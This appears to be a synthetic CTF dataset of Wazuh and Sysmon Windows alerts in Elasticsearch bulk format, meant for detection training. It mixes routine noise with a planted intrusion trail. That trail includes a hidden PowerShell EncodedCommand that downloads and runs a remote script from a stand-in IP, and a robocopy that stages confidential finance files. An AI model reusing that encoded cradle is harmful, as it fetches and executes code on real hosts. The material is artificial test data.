{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "noise-0197-6058"}}
{"agent": {"name": "FS01.corp.local", "id": "fs01", "ip": "10.10.5.40"}, "rule": {"level": 3, "description": "A process has exited.", "id": "67027"}, "data": {"win": {"system": {"eventID": "4689", "systemTime": "2025-10-08T18:48:03.886169Z", "providerName": "Microsoft-Windows-Security-Auditing"}, "eventdata": {"subjectUserName": "Administrator", "newProcessName": "C:\\Windows\\System32\\spoolsv.exe", "parentProcessName": "C:\\Windows\\System32\\services.exe", "commandLine": "spoolsv.exe", "targetLogonId": "0x0", "subjectDomainName": "CORP", "subjectLogonId": "0x6e0a4"}}}, "timestamp": "2025-10-08T18:48:03.886169Z", "location": "EventChannel"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "e7d90f50-baba-49b8-87e0-705a02c8f923"}}
{"agent": {"name": "VICTIM-HOST-01.corp.local", "id": "vh01", "ip": "10.10.5.23"}, "rule": {"level": 3, "description": "A process was created.", "id": "34012"}, "data": {"win": {"system": {"eventID": "1", "systemTime": "2025-10-08T08:05:10.576761Z", "providerName": "Microsoft-Windows-Sysmon"}, "eventdata": {"ProcessGuid": "{7786169c-671a-4f84-9d38-ab25f5da409b}", "ProcessId": "7630", "Image": "C:\\Windows\\System32\\SearchIndexer.exe", "CommandLine": "SearchIndexer.exe", "ParentProcessId": "5022", "ParentImage": "C:\\Windows\\System32\\services.exe", "Hashes": "SHA256=ab15bab000274339b32e540779919775e1036a3b276a46a7aa0e6f69b08b0ca5", "User": "CORP\\jsmith"}}}, "timestamp": "2025-10-08T08:05:10.576761Z", "location": "Sysmon"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "a0a8f054-d583-4ffb-a1de-58e4d9933c33"}}
{"agent": {"name": "FS01.corp.local", "id": "fs01", "ip": "10.10.5.40"}, "rule": {"level": 3, "description": "Network connection detected.", "id": "34013"}, "data": {"win": {"system": {"eventID": "3", "systemTime": "2025-10-08T19:20:44.408375Z", "providerName": "Microsoft-Windows-Sysmon"}, "eventdata": {"ProcessGuid": "{96cd202a-7cec-42c5-b02b-c1b53f0570b2}", "ProcessId": "9162", "Image": "C:\\Windows\\System32\\svchost.exe", "User": "CORP\\Administrator", "Protocol": "tcp", "SourceIp": "10.10.5.40", "SourcePort": "54677", "DestinationIp": "10.10.5.1", "DestinationPort": "389", "Initiated": "true"}}}, "timestamp": "2025-10-08T19:20:44.408375Z", "location": "Sysmon"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "d4f8a9c2-6b3e-4f12-9c2a-1e8f9b2a7c5d"}}
{"agent": {"name": "VICTIM-HOST-01.corp.local", "id": "vh01", "ip": "10.10.5.23"}, "rule": {"level": 3, "description": "A process was created.", "id": "34012"}, "data": {"win": {"system": {"eventID": "1", "systemTime": "2025-10-08T10:12:30.123Z", "providerName": "Microsoft-Windows-Sysmon"}, "eventdata": {"ProcessGuid": "{e9b2a6d2-9f0c-4b3d-91a4-1f2d3e5a6b7c}", "ProcessId": "5420", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "-NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand SUVYIChOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnaHR0cDovLzE5OC41MS4xMDAuMjQvZGVmZW5kZXIvc3lzX2hlYWx0aF9jaGVjay5wczEnKTsgU3RhcnQtUHJvY2VzcyBwb3dlcnNoZWxsIC1Bcmd1bWVudExpc3QgJy1Ob1Byb2ZpbGUgLVdpbmRvd1N0eWxlIEhpZGRlbiAtRmlsZSBDOlxXaW5kb3dzXFRlbXBcc3lzX2hlYWx0aF9jaGVjay5wczEn", "ParentProcessId": "668", "ParentImage": "C:\\Windows\\system32\\services.exe", "Hashes": "SHA256=3f6b2c5ea1b9f8d2a4b7c8d9e0f4a6b2c5e3d4a6b7c8e9f0a1b2c3d4e5f6a7b8", "User": "CORP\\svc-update", "Details": "EncodedCommand present; suspicious flags: -EncodedCommand, -ExecutionPolicy Bypass, -WindowStyle Hidden"}}}, "timestamp": "2025-10-08T10:12:30.123Z", "location": "Sysmon"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "ea61a8d5-d365-47cc-be67-dfbe7ef908de"}}
{"agent": {"name": "SCDC01", "id": "005", "ip": "172.16.200.50"}, "rule": {"level": 3, "description": "A logon was successful.", "id": "67027"}, "data": {"win": {"system": {"eventID": "4624", "systemTime": "2025-10-08T18:40:01.844556Z", "providerName": "Microsoft-Windows-Security-Auditing"}, "eventdata": {"subjectUserName": "Administrator", "newProcessName": "C:\\Program Files\\Mozilla Firefox\\firefox.exe", "parentProcessName": "C:\\Windows\\System32\\svchost.exe", "targetLogonId": "0x0", "subjectDomainName": "INSIGHTNEXUS", "subjectLogonId": "0x9abff"}}}, "timestamp": "2025-10-08T18:40:01.844556Z", "location": "EventChannel"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "noise-0226-6669"}}
{"agent": {"name": "FS01.corp.local", "id": "fs01", "ip": "10.10.5.40"}, "rule": {"level": 3, "description": "Network connection detected.", "id": "34013"}, "data": {"win": {"system": {"eventID": "3", "systemTime": "2025-10-08T18:48:05.603541Z", "providerName": "Microsoft-Windows-Sysmon"}, "eventdata": {"ProcessGuid": "{45782608-9558-4087-9f6f-8c8b8d47e364}", "ProcessId": "8936", "Image": "C:\\Windows\\System32\\svchost.exe", "User": "CORP\\Administrator", "Protocol": "tcp", "SourceIp": "10.10.5.40", "SourcePort": "54136", "DestinationIp": "172.16.200.50", "DestinationPort": "445", "Initiated": "true"}}}, "timestamp": "2025-10-08T18:48:05.603541Z", "location": "Sysmon"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "97b83152-fb9a-4525-a454-462eb5ab61ae"}}
{"agent": {"name": "SCDC01", "id": "005", "ip": "172.16.200.50"}, "rule": {"level": 3, "description": "A scheduled task was created.", "id": "18107"}, "data": {"win": {"system": {"eventID": "4698", "systemTime": "2025-10-08T14:27:58Z", "providerName": "Microsoft-Windows-Security-Auditing"}, "eventdata": {"subjectUserName": "Administrator", "subjectDomainName": "CORP", "taskName": "\\GoogleUpdateTaskMachineUA", "targetLogonId": "0x0", "subjectLogonId": "0x1a464"}}}, "timestamp": "2025-10-08T14:27:58Z", "location": "EventChannel"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "e2e3f651-b8b3-4bd6-b773-b516b04324a1"}}
{"agent": {"name": "FS01.corp.local", "id": "fs01", "ip": "10.10.5.40"}, "rule": {"level": 3, "description": "A process was created.", "id": "67027"}, "data": {"win": {"system": {"eventID": "4688", "systemTime": "2025-10-08T19:53:38.800539Z", "providerName": "Microsoft-Windows-Security-Auditing"}, "eventdata": {"subjectUserName": "Administrator", "newProcessName": "C:\\Windows\\System32\\robocopy.exe", "parentProcessName": "C:\\Windows\\System32\\cmd.exe", "commandLine": "robocopy.exe \"D:\\Shares\\Public\" \"D:\\Backups\\Public\" /MIR", "targetLogonId": "0x0", "subjectDomainName": "CORP", "subjectLogonId": "0xe090f"}}}, "timestamp": "2025-10-08T19:53:38.800539Z", "location": "EventChannel"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "noise-0002-6895"}}
{"agent": {"name": "VICTIM-HOST-01.corp.local", "id": "vh01", "ip": "10.10.5.23"}, "rule": {"level": 3, "description": "A process was created.", "id": "34012"}, "data": {"win": {"system": {"eventID": "1", "systemTime": "2025-10-08T10:36:37.767447Z", "providerName": "Microsoft-Windows-Sysmon"}, "eventdata": {"ProcessGuid": "{75836b6c-ed60-453b-8bd3-b7c4e07a06b7}", "ProcessId": "3714", "Image": "C:\\Windows\\System32\\spoolsv.exe", "CommandLine": "spoolsv.exe", "ParentProcessId": "6452", "ParentImage": "C:\\Windows\\System32\\services.exe", "Hashes": "SHA256=98cf4666bd0c4cb59b8885401827cc8ae9ff260645bd423a983f436e502d7e35", "User": "NT AUTHORITY\\SYSTEM"}}}, "timestamp": "2025-10-08T10:36:37.767447Z", "location": "Sysmon"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "noise-0157-7990"}}
{"agent": {"name": "SCDC01", "id": "005", "ip": "172.16.200.50"}, "rule": {"level": 3, "description": "A logon was successful.", "id": "67027"}, "data": {"win": {"system": {"eventID": "4624", "systemTime": "2025-10-08T18:07:15.041000Z", "providerName": "Microsoft-Windows-Security-Auditing"}, "eventdata": {"subjectUserName": "adm.backup_svc", "newProcessName": "C:\\Windows\\System32\\cmd.exe", "parentProcessName": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe", "targetLogonId": "0x0", "subjectDomainName": "INSIGHTNEXUS", "subjectLogonId": "0x71c0e", "logonType": "9"}}}, "timestamp": "2025-10-08T18:09:02.041000Z", "location": "EventChannel"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "noise-0184-9928"}}
{"agent": {"name": "FS01.corp.local", "id": "fs01", "ip": "10.10.5.40"}, "rule": {"level": 3, "description": "A process has exited.", "id": "67027"}, "data": {"win": {"system": {"eventID": "4689", "systemTime": "2025-10-08T18:34:38.031494Z", "providerName": "Microsoft-Windows-Security-Auditing"}, "eventdata": {"subjectUserName": "Administrator", "newProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "parentProcessName": "C:\\Windows\\explorer.exe", "commandLine": "powershell.exe Get-ChildItem D:\\Shares", "targetLogonId": "0x0", "subjectDomainName": "CORP", "subjectLogonId": "0x652c9"}}}, "timestamp": "2025-10-08T18:34:38.031494Z", "location": "EventChannel"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "noise-0021-1926"}}
{"agent": {"name": "VICTIM-HOST-01.corp.local", "id": "vh01", "ip": "10.10.5.23"}, "rule": {"level": 3, "description": "A process was created.", "id": "34012"}, "data": {"win": {"system": {"eventID": "1", "systemTime": "2025-10-08T11:19:31.389630Z", "providerName": "Microsoft-Windows-Sysmon"}, "eventdata": {"ProcessGuid": "{462f0bef-37be-4b4b-ac20-41943f01cb92}", "ProcessId": "1633", "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "CommandLine": "chrome.exe", "ParentProcessId": "6282", "ParentImage": "C:\\Windows\\explorer.exe", "Hashes": "SHA256=ffc70ae163f24e63a18178712a276499a59237b971174f46a7fca82bce79b326", "User": "CORP\\jsmith"}}}, "timestamp": "2025-10-08T11:19:31.389630Z", "location": "Sysmon"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "90d87abb-917c-4bbc-bad9-dc321e09c001"}}
{"agent": {"name": "VICTIM-HOST-01.corp.local", "id": "vh01", "ip": "10.10.5.23"}, "rule": {"level": 3, "description": "Network connection detected.", "id": "34013"}, "data": {"win": {"system": {"eventID": "3", "systemTime": "2025-10-08T10:09:06.404833Z", "providerName": "Microsoft-Windows-Sysmon"}, "eventdata": {"ProcessGuid": "{dbd1a79a-bef7-40ec-9b69-c2a12a7c05a7}", "ProcessId": "9491", "Image": "C:\\Windows\\System32\\RuntimeBroker.exe", "User": "CORP\\mreyes", "Protocol": "tcp", "SourceIp": "10.10.5.23", "SourcePort": "63925", "DestinationIp": "142.250.80.100", "DestinationPort": "443", "Initiated": "true", "DestinationHostname": "www.google.com"}}}, "timestamp": "2025-10-08T10:09:06.404833Z", "location": "Sysmon"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "noise-0090-2984"}}
{"agent": {"name": "VICTIM-HOST-01.corp.local", "id": "vh01", "ip": "10.10.5.23"}, "rule": {"level": 3, "description": "Network connection detected.", "id": "34013"}, "data": {"win": {"system": {"eventID": "3", "systemTime": "2025-10-08T10:50:50.507558Z", "providerName": "Microsoft-Windows-Sysmon"}, "eventdata": {"ProcessGuid": "{dd248cb0-cca2-4264-bbee-49fe70099292}", "ProcessId": "2488", "Image": "C:\\Windows\\System32\\notepad.exe", "User": "CORP\\svc-backup", "Protocol": "tcp", "SourceIp": "10.10.5.23", "SourcePort": "49759", "DestinationIp": "13.107.42.13", "DestinationPort": "443", "Initiated": "true", "DestinationHostname": "onedrive.live.com"}}}, "timestamp": "2025-10-08T10:50:50.507558Z", "location": "Sysmon"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "noise-0017-1708"}}
{"agent": {"name": "VICTIM-HOST-01.corp.local", "id": "vh01", "ip": "10.10.5.23"}, "rule": {"level": 3, "description": "A process was created.", "id": "34012"}, "data": {"win": {"system": {"eventID": "1", "systemTime": "2025-10-08T09:22:34.344343Z", "providerName": "Microsoft-Windows-Sysmon"}, "eventdata": {"ProcessGuid": "{8603df46-ee43-49a2-acaa-e0474627362f}", "ProcessId": "5534", "Image": "C:\\Windows\\System32\\spoolsv.exe", "CommandLine": "spoolsv.exe", "ParentProcessId": "2686", "ParentImage": "C:\\Windows\\System32\\services.exe", "Hashes": "SHA256=084d7f61c95048c88328d8223a368ad39b10fe01c6eb42dd8e186591ffd60d71", "User": "CORP\\svc-backup"}}}, "timestamp": "2025-10-08T09:22:34.344343Z", "location": "Sysmon"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "491d06ee-1a81-4fbd-b3ff-1dfa01eb6f57"}}
{"agent": {"name": "FS01.corp.local", "id": "fs01", "ip": "10.10.5.40"}, "rule": {"level": 3, "description": "A process has exited.", "id": "67027"}, "data": {"win": {"system": {"eventID": "4689", "systemTime": "2025-10-08T18:58:32.316518Z", "providerName": "Microsoft-Windows-Security-Auditing"}, "eventdata": {"subjectUserName": "Administrator", "newProcessName": "C:\\Windows\\System32\\xcopy.exe", "parentProcessName": "C:\\Windows\\System32\\cmd.exe", "commandLine": "xcopy.exe \"D:\\Shares\\HR\\Templates\" \"D:\\Shares\\HR\\Templates_bak\" /E", "targetLogonId": "0x0", "subjectDomainName": "CORP", "subjectLogonId": "0x25196"}}}, "timestamp": "2025-10-08T18:58:32.316518Z", "location": "EventChannel"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "noise-0028-3113"}}
{"agent": {"name": "VICTIM-HOST-01.corp.local", "id": "vh01", "ip": "10.10.5.23"}, "rule": {"level": 3, "description": "A process was created.", "id": "34012"}, "data": {"win": {"system": {"eventID": "1", "systemTime": "2025-10-08T12:16:06.105281Z", "providerName": "Microsoft-Windows-Sysmon"}, "eventdata": {"ProcessGuid": "{75fe91c9-45d5-4058-84fa-d1e0fcd759d0}", "ProcessId": "4042", "Image": "C:\\Windows\\System32\\spoolsv.exe", "CommandLine": "spoolsv.exe", "ParentProcessId": "3142", "ParentImage": "C:\\Windows\\System32\\services.exe", "Hashes": "SHA256=5857679e9f2b4b87a335d54442c3708822c0dd4315dd444f81ac99ae4e332a15", "User": "CORP\\mreyes"}}}, "timestamp": "2025-10-08T12:16:06.105281Z", "location": "Sysmon"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "73e4e1fc-4b44-4181-a324-e495f7a7acfc"}}
{"agent": {"name": "SCDC01", "id": "005", "ip": "172.16.200.50"}, "rule": {"level": 3, "description": "A process was created.", "id": "67027"}, "data": {"win": {"system": {"eventID": "4688", "systemTime": "2025-10-08T17:07:51.013561Z", "providerName": "Microsoft-Windows-Security-Auditing"}, "eventdata": {"subjectUserName": "Administrator", "newProcessName": "C:\\Windows\\System32\\WerFault.exe", "parentProcessName": "C:\\Windows\\explorer.exe", "targetLogonId": "0x0", "subjectDomainName": "INSIGHTNEXUS", "subjectLogonId": "0xcb652"}}}, "timestamp": "2025-10-08T17:07:51.013561Z", "location": "EventChannel"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "noise-0160-8836"}}
{"agent": {"name": "FS01.corp.local", "id": "fs01", "ip": "10.10.5.40"}, "rule": {"level": 3, "description": "A process was created.", "id": "67027"}, "data": {"win": {"system": {"eventID": "4688", "systemTime": "2025-10-08T19:17:08.944558Z", "providerName": "Microsoft-Windows-Security-Auditing"}, "eventdata": {"subjectUserName": "Administrator", "newProcessName": "C:\\Windows\\System32\\robocopy.exe", "parentProcessName": "C:\\Windows\\System32\\cmd.exe", "commandLine": "robocopy.exe \"D:\\Shares\\Public\" \"D:\\Backups\\Public\" /MIR", "targetLogonId": "0x0", "subjectDomainName": "CORP", "subjectLogonId": "0xd75a1"}}}, "timestamp": "2025-10-08T19:17:08.944558Z", "location": "EventChannel"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "noise-0128-8883"}}
{"agent": {"name": "SCDC01", "id": "005", "ip": "172.16.200.50"}, "rule": {"level": 3, "description": "A process has exited.", "id": "67027"}, "data": {"win": {"system": {"eventID": "4689", "systemTime": "2025-10-08T19:19:30.001276Z", "providerName": "Microsoft-Windows-Security-Auditing"}, "eventdata": {"subjectUserName": "Administrator", "newProcessName": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", "parentProcessName": "C:\\Windows\\explorer.exe", "targetLogonId": "0x0", "subjectDomainName": "INSIGHTNEXUS", "subjectLogonId": "0xad485"}}}, "timestamp": "2025-10-08T19:19:30.001276Z", "location": "EventChannel"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "noise-0131-2050"}}
{"agent": {"name": "SCDC01", "id": "005", "ip": "172.16.200.50"}, "rule": {"level": 3, "description": "A process was created.", "id": "67027"}, "data": {"win": {"system": {"eventID": "4688", "systemTime": "2025-10-08T19:20:39.656518Z", "providerName": "Microsoft-Windows-Security-Auditing"}, "eventdata": {"subjectUserName": "Administrator", "newProcessName": "C:\\Windows\\System32\\WerFault.exe", "parentProcessName": "C:\\Windows\\explorer.exe", "targetLogonId": "0x0", "subjectDomainName": "INSIGHTNEXUS", "subjectLogonId": "0xdfab8"}}}, "timestamp": "2025-10-08T19:20:39.656518Z", "location": "EventChannel"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "noise-0020-5006"}}
{"agent": {"name": "VICTIM-HOST-01.corp.local", "id": "vh01", "ip": "10.10.5.23"}, "rule": {"level": 3, "description": "A process was created.", "id": "34012"}, "data": {"win": {"system": {"eventID": "1", "systemTime": "2025-10-08T09:23:17.608486Z", "providerName": "Microsoft-Windows-Sysmon"}, "eventdata": {"ProcessGuid": "{928faddd-9400-4529-8c19-47dd27900ebf}", "ProcessId": "7203", "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "CommandLine": "WINWORD.EXE", "ParentProcessId": "1453", "ParentImage": "C:\\Windows\\explorer.exe", "Hashes": "SHA256=e138a62932374e9aa2ed8fbd163de0c6c7120c091d664d1e974c480c6d07f6e4", "User": "CORP\\jsmith"}}}, "timestamp": "2025-10-08T09:23:17.608486Z", "location": "Sysmon"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "noise-0024-8111"}}
{"agent": {"name": "VICTIM-HOST-01.corp.local", "id": "vh01", "ip": "10.10.5.23"}, "rule": {"level": 3, "description": "A process was created.", "id": "34012"}, "data": {"win": {"system": {"eventID": "1", "systemTime": "2025-10-08T12:25:02.839775Z", "providerName": "Microsoft-Windows-Sysmon"}, "eventdata": {"ProcessGuid": "{3c1adb06-2776-45f3-8444-131987b3a54e}", "ProcessId": "7537", "Image": "C:\\Windows\\System32\\conhost.exe", "CommandLine": "conhost.exe", "ParentProcessId": "1001", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "Hashes": "SHA256=3bee6750c74a476cb46967c400a084e919a113afb368449fbd91151aeb7e6d7a", "User": "CORP\\jsmith"}}}, "timestamp": "2025-10-08T12:25:02.839775Z", "location": "Sysmon"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "254a7b84-93be-4ddd-9e20-8a2d9187c1cd"}}
{"agent": {"name": "VICTIM-HOST-01.corp.local", "id": "vh01", "ip": "10.10.5.23"}, "rule": {"level": 3, "description": "A process was created.", "id": "34012"}, "data": {"win": {"system": {"eventID": "1", "systemTime": "2025-10-08T08:50:10.085119Z", "providerName": "Microsoft-Windows-Sysmon"}, "eventdata": {"ProcessGuid": "{24e1d2f3-45d5-41d0-aa57-edbf4a456e18}", "ProcessId": "1251", "Image": "C:\\Program Files\\Zoom\\bin\\Zoom.exe", "CommandLine": "Zoom.exe", "ParentProcessId": "5903", "ParentImage": "C:\\Windows\\explorer.exe", "Hashes": "SHA256=727cb009cfe3464f90f00e917f7b6d3918c33e76b3f0405f99d83e58ed7dad73", "User": "CORP\\svc-backup"}}}, "timestamp": "2025-10-08T08:50:10.085119Z", "location": "Sysmon"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "f52e166e-6e91-4f39-adcd-b5c573628467"}}
{"agent": {"name": "VICTIM-HOST-01.corp.local", "id": "vh01", "ip": "10.10.5.23"}, "rule": {"level": 3, "description": "A process was created.", "id": "34012"}, "data": {"win": {"system": {"eventID": "1", "systemTime": "2025-10-08T09:40:28.585316Z", "providerName": "Microsoft-Windows-Sysmon"}, "eventdata": {"ProcessGuid": "{ddb11e97-6d18-4880-b225-13a974682a58}", "ProcessId": "8470", "Image": "C:\\Windows\\System32\\wuauclt.exe", "CommandLine": "wuauclt.exe", "ParentProcessId": "7691", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "Hashes": "SHA256=a215441ed8994d8cb97a7e04b71e7b399384951691d44aaabb3d612bce36b20b", "User": "CORP\\mreyes"}}}, "timestamp": "2025-10-08T09:40:28.585316Z", "location": "Sysmon"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "noise-0237-9161"}}
{"agent": {"name": "FS01.corp.local", "id": "fs01", "ip": "10.10.5.40"}, "rule": {"level": 3, "description": "A process was created.", "id": "67027"}, "data": {"win": {"system": {"eventID": "4688", "systemTime": "2025-10-08T18:15:22.014000Z", "providerName": "Microsoft-Windows-Security-Auditing"}, "eventdata": {"subjectUserName": "adm.backup_svc", "newProcessName": "C:\\Windows\\System32\\robocopy.exe", "parentProcessName": "C:\\Windows\\System32\\cmd.exe", "commandLine": "robocopy.exe \"D:\\Shares\\Finance\\Confidential\" C:\\Windows\\Temp\\backup_staging /E /COPYALL /R:1", "targetLogonId": "0x0", "subjectDomainName": "CORP", "subjectLogonId": "0x7f02b"}}}, "timestamp": "2025-10-08T18:15:22.014000Z", "location": "EventChannel"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "373d1756-18fd-4f23-ba80-cfea13c142b2"}}
{"agent": {"name": "FS01.corp.local", "id": "fs01", "ip": "10.10.5.40"}, "rule": {"level": 3, "description": "Network connection detected.", "id": "34013"}, "data": {"win": {"system": {"eventID": "3", "systemTime": "2025-10-08T18:21:21.434913Z", "providerName": "Microsoft-Windows-Sysmon"}, "eventdata": {"ProcessGuid": "{af7d426e-21fe-4b40-b721-838417b41c4c}", "ProcessId": "4940", "Image": "C:\\Windows\\System32\\svchost.exe", "User": "CORP\\Administrator", "Protocol": "tcp", "SourceIp": "10.10.5.40", "SourcePort": "51245", "DestinationIp": "13.107.4.50", "DestinationPort": "443", "Initiated": "true", "DestinationHostname": "update.microsoft.com"}}}, "timestamp": "2025-10-08T18:21:21.434913Z", "location": "Sysmon"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "7140639f-2725-4aa3-a804-58dc13c78a88"}}
{"agent": {"name": "SCDC01", "id": "005", "ip": "172.16.200.50"}, "rule": {"level": 3, "description": "A logon was successful.", "id": "67027"}, "data": {"win": {"system": {"eventID": "4624", "systemTime": "2025-10-08T17:09:12.397400Z", "providerName": "Microsoft-Windows-Security-Auditing"}, "eventdata": {"subjectUserName": "Administrator", "newProcessName": "C:\\Program Files\\7-Zip\\7zFM.exe", "parentProcessName": "C:\\Windows\\explorer.exe", "targetLogonId": "0x0", "subjectDomainName": "INSIGHTNEXUS", "subjectLogonId": "0x9429b"}}}, "timestamp": "2025-10-08T17:09:12.397400Z", "location": "EventChannel"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "ef3e35e6-d7af-4cdb-a82d-d524960853df"}}
{"agent": {"name": "VICTIM-HOST-01.corp.local", "id": "vh01", "ip": "10.10.5.23"}, "rule": {"level": 3, "description": "A process was created.", "id": "34012"}, "data": {"win": {"system": {"eventID": "1", "systemTime": "2025-10-08T12:35:59.120655Z", "providerName": "Microsoft-Windows-Sysmon"}, "eventdata": {"ProcessGuid": "{aba6c786-89ba-425b-b052-76f4b40d3055}", "ProcessId": "7524", "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", "CommandLine": "OUTLOOK.EXE", "ParentProcessId": "5560", "ParentImage": "C:\\Windows\\explorer.exe", "Hashes": "SHA256=7c54c681e7ad4fba83e8c03d2cb314787a27c18b476c4cf98ca9047f60cbf2bb", "User": "CORP\\mreyes"}}}, "timestamp": "2025-10-08T12:35:59.120655Z", "location": "Sysmon"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "noise-0206-8441"}}
{"agent": {"name": "FS01.corp.local", "id": "fs01", "ip": "10.10.5.40"}, "rule": {"level": 3, "description": "A process has exited.", "id": "67027"}, "data": {"win": {"system": {"eventID": "4689", "systemTime": "2025-10-08T19:31:09.820388Z", "providerName": "Microsoft-Windows-Security-Auditing"}, "eventdata": {"subjectUserName": "Administrator", "newProcessName": "C:\\Program Files\\Notepad++\\notepad++.exe", "parentProcessName": "C:\\Windows\\explorer.exe", "commandLine": "notepad++.exe", "targetLogonId": "0x0", "subjectDomainName": "CORP", "subjectLogonId": "0x3f2bc"}}}, "timestamp": "2025-10-08T19:31:09.820388Z", "location": "EventChannel"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "a3de5ee6-addf-4d98-b5d5-6084a6582e3b"}}
{"agent": {"name": "VICTIM-HOST-01.corp.local", "id": "vh01", "ip": "10.10.5.23"}, "rule": {"level": 3, "description": "A process was created.", "id": "34012"}, "data": {"win": {"system": {"eventID": "1", "systemTime": "2025-10-08T11:01:27.996345Z", "providerName": "Microsoft-Windows-Sysmon"}, "eventdata": {"ProcessGuid": "{19519521-1358-4452-b3db-61d37d041407}", "ProcessId": "9567", "Image": "C:\\Windows\\System32\\notepad.exe", "CommandLine": "notepad.exe", "ParentProcessId": "9956", "ParentImage": "C:\\Windows\\explorer.exe", "Hashes": "SHA256=e8d4f2d28f764e4891b614a46cc916f48a50dc2aec0b40f0aae4c6e0c03a1396", "User": "CORP\\mreyes"}}}, "timestamp": "2025-10-08T11:01:27.996345Z", "location": "Sysmon"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "ed8dff32-e916-40c5-94a9-0fee6192147b"}}
{"agent": {"name": "SCDC01", "id": "005", "ip": "172.16.200.50"}, "rule": {"level": 3, "description": "A process was created.", "id": "67027"}, "data": {"win": {"system": {"eventID": "4688", "systemTime": "2025-10-08T19:09:39.218860Z", "providerName": "Microsoft-Windows-Security-Auditing"}, "eventdata": {"subjectUserName": "Administrator", "newProcessName": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "parentProcessName": "C:\\Windows\\explorer.exe", "targetLogonId": "0x0", "subjectDomainName": "INSIGHTNEXUS", "subjectLogonId": "0xf510d"}}}, "timestamp": "2025-10-08T19:09:39.218860Z", "location": "EventChannel"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "a5b7724a-3c29-4492-91bc-e3192a6fb6d4"}}
{"agent": {"name": "VICTIM-HOST-01.corp.local", "id": "vh01", "ip": "10.10.5.23"}, "rule": {"level": 3, "description": "Network connection detected.", "id": "34013"}, "data": {"win": {"system": {"eventID": "3", "systemTime": "2025-10-08T12:02:16.546119Z", "providerName": "Microsoft-Windows-Sysmon"}, "eventdata": {"ProcessGuid": "{9fab304d-6be3-40ea-ad8a-e6ac65313ddc}", "ProcessId": "4003", "Image": "C:\\Program Files (x86)\\Microsoft\\Teams\\current\\Teams.exe", "User": "CORP\\jsmith", "Protocol": "tcp", "SourceIp": "10.10.5.23", "SourcePort": "52655", "DestinationIp": "10.10.5.5", "DestinationPort": "8080", "Initiated": "true"}}}, "timestamp": "2025-10-08T12:02:16.546119Z", "location": "Sysmon"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "01706ee8-94a6-4ad3-a557-94c7be29d2e8"}}
{"agent": {"name": "VICTIM-HOST-01.corp.local", "id": "vh01", "ip": "10.10.5.23"}, "rule": {"level": 3, "description": "A process was created.", "id": "34012"}, "data": {"win": {"system": {"eventID": "1", "systemTime": "2025-10-08T08:14:28.437672Z", "providerName": "Microsoft-Windows-Sysmon"}, "eventdata": {"ProcessGuid": "{4de2d435-5fe6-4260-9c77-466db9b29ef3}", "ProcessId": "2782", "Image": "C:\\Windows\\System32\\taskhostw.exe", "CommandLine": "taskhostw.exe", "ParentProcessId": "9635", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "Hashes": "SHA256=e35039141ed643168288ed7d8639e6e52f8fb12c81134989bc7f38b60b464f38", "User": "CORP\\jsmith"}}}, "timestamp": "2025-10-08T08:14:28.437672Z", "location": "Sysmon"}
{"index": {"_index": "wazuh-alerts-ctf-v3", "_id": "noise-0181-2266"}}
{"agent": {"name": "FS01.corp.local", "id": "fs01", "ip": "10.10.5.40"}, "rule": {"level": 3, "description": "A process was created.", "id": "67027"}, "data": {"win": {"system": {"eventID": "4688", "systemTime": "2025-10-08T19:10:38.800026Z", "providerName": "Microsoft-Windows-Security-Auditing"}, "eventdata": {"subjectUserName": "Administrator", "newProcessName": "C:\\Program Files\\Notepad++\\notepad++.exe", "parentProcessName": "C:\\Windows\\explorer.exe", "commandLine": "notepad++.exe", "targetLogonId": "0x0", "subjectDomainName": "CORP", "subjectLogonId": "0xb6d75"}}}, "timestamp": "2025-10-08T19:10:38.800026Z", "location": "EventChannel"}
